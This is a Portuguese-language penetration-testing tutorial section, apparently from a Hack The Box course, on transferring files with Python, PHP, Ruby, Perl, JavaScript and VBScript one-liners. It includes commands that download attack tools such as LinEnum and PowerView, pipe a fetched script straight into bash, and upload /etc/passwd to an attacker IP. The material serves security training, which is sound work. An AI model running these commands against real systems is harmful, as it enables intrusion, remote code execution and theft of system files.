É comum encontrar diferentes linguagens de programação instaladas nas máquinas que estamos segmentando. Linguagens de programação como Python, PHP, Perl e Ruby estão geralmente disponíveis nas distribuições Linux, mas também podem ser instaladas no Windows, embora isso seja muito menos comum.

Podemos usar alguns aplicativos padrão do Windows, como `cscript` e `mshta`, para executar código JavaScript ou VBScript. O JavaScript também pode ser executado nos hosts do Linux.

Segundo a Wikipedia, existem por aí [700 linguagens de programação](https://en.wikipedia.org/wiki/List_of_programming_languages), e podemos criar código em qualquer idioma de programação, para baixar, carregar ou executar instruções no sistema operacional. Esta seção fornecerá alguns exemplos usando linguagens de programação comuns.

## Python

Python é uma linguagem de programação popular. Atualmente, a versão 3 é suportada, mas podemos encontrar servidores onde o Python versão 2.7 ainda sai. `Python` pode executar one-liners a partir de uma linha de comando do sistema operacional usando a opção `-c`. Vamos ver alguns exemplos:

#### Python 2 - Download

```shell-session
casluxd@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

#### Python 3 - Baixar

```shell-session
casluxd@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

## PHP

`PHP` também é muito prevalente e fornece vários métodos de transferência de arquivos. [De acordo com os dados da W3Techs](https://w3techs.com/technologies/details/pl-php), O PHP é usado por 77,4% de todos os sites com uma linguagem de programação conhecida no servidor. Embora as informações não sejam precisas e o número possa ser um pouco menor, geralmente encontramos serviços da Web que usam PHP ao executar uma operação ofensiva.

Vamos ver alguns exemplos de download de arquivos usando PHP.

No exemplo a seguir, usaremos o PHP [file_get_contents ( módulo )](https://www.php.net/manual/en/function.file-get-contents.php) para baixar conteúdo de um site combinado com o [file_put_contents ( ) módulo](https://www.php.net/manual/en/function.file-put-contents.php) para salvar o arquivo em um diretório. `PHP` pode ser usado para executar one-liners a partir de uma linha de comando do sistema operacional usando a opção `-r`.

#### Download do PHP com File_get_contents ( )

```shell-session
casluxd@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

Uma alternativa para `file_get_contents()` e `file_put_contents()` é o [módulo fpopen ( )](https://www.php.net/manual/en/function.fopen.php). Podemos usar este módulo para abrir um URL, ler o conteúdo e salvá-lo em um arquivo.

```shell-session
casluxd@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

Também podemos enviar o conteúdo baixado para um pipe, semelhante ao exemplo sem arquivo que executamos na seção anterior usando cURL e wget.

#### PHP Baixe um arquivo e pipe-o para Bash

```shell-session
casluxd@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

`**Nota:** O URL pode ser usado como um nome de arquivo com a função @file se os wrappers abertos tiverem sido ativados.`

## Outras linguagens

`Ruby` e `Perl` são outros idiomas populares que também podem ser usados para transferir arquivos. Essas duas linguagens de programação também oferecem suporte à execução de um liners a partir de uma linha de comando do sistema operacional usando a opção `-e`.

#### Ruby - Baixe um arquivo

```shell-session
casluxd@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

#### Perl - Baixar um arquivo

```shell-session
casluxd@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

## JavaScript

O JavaScript é uma linguagem de script ou programação que permite implementar recursos complexos em páginas da web. Como em outras linguagens de programação, podemos usá-lo para muitas coisas diferentes.

O seguinte código JavaScript é baseado em [este](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) post, e podemos baixar um arquivo usando-o. Criaremos um arquivo chamado `wget.js` e salve o seguinte conteúdo:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

Podemos usar o seguinte comando em um prompt de comando do Windows ou terminal PowerShell para executar nosso código JavaScript e baixar um arquivo.

#### Faça o download de um arquivo usando JavaScript e cscript.exe

```cmd-session
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

## VBScript

[VBScript](https://en.wikipedia.org/wiki/VBScript) ( "Microsoft Visual Basic Scripting Edition" ) é uma linguagem de script ativo desenvolvida pela Microsoft que é modelada no Visual Basic. O VBScript foi instalado por padrão em todas as versões para desktop do Microsoft Windows desde o Windows 98.

O exemplo a seguir do VBScript pode ser usado com base em [isto](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs). Criaremos um arquivo chamado `wget.vbs` e salve o seguinte conteúdo:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

Podemos usar o seguinte comando em um prompt de comando do Windows ou terminal PowerShell para executar nosso código VBScript e baixar um arquivo.

#### Faça o download de um arquivo usando o VBScript e o cscript.exe

```cmd-session
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

## Carregar operações usando Python3

Se queremos fazer upload de um arquivo, precisamos entender as funções em uma linguagem de programação específica para executar a operação de upload. O Python3 [módulo de solicitações](https://pypi.org/project/requests/) permite enviar solicitações HTTP ( GET, POST, PUT, etc. ) usando Python. Podemos usar o seguinte código se quisermos enviar um arquivo para o nosso Python3 [uploadserver](https://github.com/Densaugeo/uploadserver).

#### Iniciando o  módulo Python uploadserver

```shell-session
casluxd@htb[/htb]$ python3 -m uploadserver 

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Upload de um arquivo usando um one-liner Python

```shell-session
casluxd@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

Vamos dividir esse one-liner em várias linhas para entender melhor cada peça.

```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```

Podemos fazer o mesmo com qualquer outra linguagem de programação. Uma boa prática é escolher uma e tentar criar um programa de upload.

